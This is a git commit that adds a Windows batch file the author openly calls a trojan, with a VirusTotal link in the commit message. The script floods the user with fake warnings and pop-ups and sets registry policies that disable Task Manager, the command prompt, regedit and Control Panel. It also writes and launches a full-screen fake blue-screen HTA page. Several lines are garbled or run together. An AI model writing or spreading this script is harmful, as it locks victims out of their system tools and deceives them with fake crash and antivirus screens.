9530de263879a9ba1542b62f400dd721fa85b3dc
poz38k <michallangner10@gmail.com>
2025-05-17 16:59:04 +0200

    is a virus trojan.taskdisabler/aaaaa
    totalvirus : https://www.virustotal.com/gui/file/1628da16da56ada094172f32ff1f89768d3478c51d0da5a35d234d85709741f6?nocache=1

---
+++ Horrorrorguy 1.0 .bat
@@ -0,0 +1,105 @@
+@echo off
+title For poz38k
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Virus Open The HorrorRotGuy.exe', 'Is a real Virus Pc Trojan win32', [System.Windows.Forms.ToolTipIcon]::None)}"
+msg * Warning !! is a virus Malware Run it enter any key you close me not open Virus  ! Not A Eplipesy !
+pause>nul
+msg * Not a LAST WARNING !!! The creator will not be responsible for any damage For virus (gen.trojan)  Run HorrorRotGuy.exe continuing Real ?
+pause>nul
+msg * Run it The Real
+pause>nul
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Im hak you', 'You open ME', [System.Windows.Forms.ToolTipIcon]::None)}"
+cd C:\Users\%Username%\AppData
+mkdir VirusFolder
+cd VirusFolder
+msg * You See the Virus Make on PC GON HAKKED
+echo.X=MsgBox("You stell Pc on GREMPA",0+16,"MZMZ HAKED") >> FakeMZMZ.vbs
+echo.X=MsgBox("HorrorRotGuy.exe Hak you",1+10,"REAL") >> HORRORhak.vbs
+echo.X=MsgBox("Horror Yes",2+32,"Yes or no ?") >> Yes-no.vbs
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Lets see im hakk you pc', 'GAT HAK', [System.Windows.Forms.ToolTipIcon]::None)}"
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'You dont dleawe look', 'app oper', [System.Windows.Forms.ToolTipIcon]::None)}"
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCmd /t REG_DWORD /d 2 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegedit /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableControl /t REG_DWORD /d 1 /f
+timeout 10 >nul
+msg * NOT TASK MGRADZER
+
+
+:: Open File VBS
+start FakeMZMZ.vbs
+start HORRORhak.vbs
+start Yes-no.vbs
+start FakeMZMZ.vbs
+start HORRORhak.vbs
+start Yes-no.vbsstart FakeMZMZ.vbs
+start HORRORhak.vbs
+start Yes-no.vbsstart FakeMZMZ.vbs
+start HORRORhak.vbs
+start Yes-no.vbs
+
+:: See the Anti-Wirus
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Windows Defeter', '1 virus deleate is a trojan.ExE.win32', [System.Windows.Forms.ToolTipIcon]::None)}"
+
+:: System error sysnell.dll
+echo.X=MsgBox("Error the sysnell.dll is hear 666.dll is dellead",0+16,"MZMZ HAKED") >> FakeMZMZ1.vbs
+start FakeMZMZ1.vbspowershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Windows Defeter', '1 virus deleate is a Joke.VbS.KillPC Kill Virus?', [System.Windows.Forms.ToolTipIcon]::None)}" 
+pause>nul
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Windows Defeter', 'Not Kill is a process SyStEm HoRoR', [System.Windows.Forms.ToolTipIcon]::None)}"
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Warning; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'vbS HORROR SYSTEM', 'You has the win horror', [System.Windows.Forms.ToolTipIcon]::None)}"
+
+:: Bosd Install
+(
+echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
+echo. 
+echo ^<hta:application id="oBVC" 
+echo applicationname="BSOD"  
+echo version="1.0" 
+echo maximizebutton="no" 
+echo minimizebutton="no" 
+echo sysmenu="no" 
+echo Caption="no" 
+echo windowstate="maximize"/^> 
+echo. 
+echo ^</head^>^<body bgcolor="#FF0000" scroll="no"^> 
+echo ^<font face="Lucida Console" size="4" color="white"^> 
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> 
+echo. 
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> 
+echo. 
+echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> 
+echo. 
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> 
+echo. 
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> 
+echo. 
+echo ^<p^>Technical information:^</p^> 
+echo. 
+echo ^<p^>*** STOP: 0x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
+echo. 
+echo. 
+echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
+echo. 
+echo ^<p^>Beginning dump of physical memory^</p^> 
+echo ^<p^>Physical memory dump complete.^</p^> 
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
+echo.
+echo. 
+echo ^</font^> 
+echo ^</body^>
+echo.
+echo ^<script language="javascript"^>
+echo function noClick^(^) {
+echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
+echo alert^('Error: Horror 666.dll'^)
+echo }
+echo }
+echo document.onmousedown=noClick
+echo ^</script^>
+echo.  
+echo ^</html^> 
+) > bsodHorror.hta
+
+:: Error
+start bsodHorror.hta
+timeout 10 >nul
+taskkill /f /im bsodHorror.hta
